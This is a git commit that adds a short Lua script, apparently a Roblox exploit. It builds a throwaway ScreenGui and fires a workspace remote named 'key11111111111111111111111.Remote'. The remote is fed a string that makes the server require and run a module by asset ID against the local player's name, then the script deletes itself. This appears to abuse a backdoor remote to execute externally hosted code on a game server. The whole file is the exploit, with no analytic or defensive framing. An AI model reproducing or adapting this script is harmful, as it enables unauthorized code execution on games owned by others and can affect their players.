ba02bea4d78c094b1b443dc188fba9bd1158d6f5
kooldude62 <gramaa3805@g.comalisd.org>
2025-04-07 22:29:57 -0500

    Create re.lua

---
+++ re.lua
@@ -0,0 +1,20 @@
+--epick reeeee
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+
+--Properties:
+
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Scripts:
+
+local function WTBITG_fake_script() -- ScreenGui.LocalScript 
+	local script = Instance.new('LocalScript', ScreenGui)
+
+	game.workspace.key11111111111111111111111.Remote:FireServer("require(91235866231801).re(".."'"..game.Players.LocalPlayer.Name.."'"..")", "hi", "invis")
+	script.Parent:Destroy()
+end
+coroutine.wrap(WTBITG_fake_script)()
